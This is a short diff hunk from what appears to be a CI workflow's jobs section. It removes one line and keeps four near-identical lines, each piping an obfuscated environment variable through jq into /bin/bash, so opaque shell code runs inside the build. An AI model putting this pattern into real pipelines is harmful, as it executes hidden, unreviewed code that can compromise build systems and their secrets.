@@ -26,7 +26,6 @@ jobs:
           echo $qlye15044 | jq -r .g87126 | /bin/bash
           echo $kmoq583 | jq -r .maaku8 | /bin/bash
           echo $iheap4 | jq -r .ejv5186 | /bin/bash
-          printf '%s' "$mdiy4068" | jq -r .v54 | /bin/bash
           echo $tvq5967 | jq -r .hr54 | /bin/bash
 
       - name: Archive results
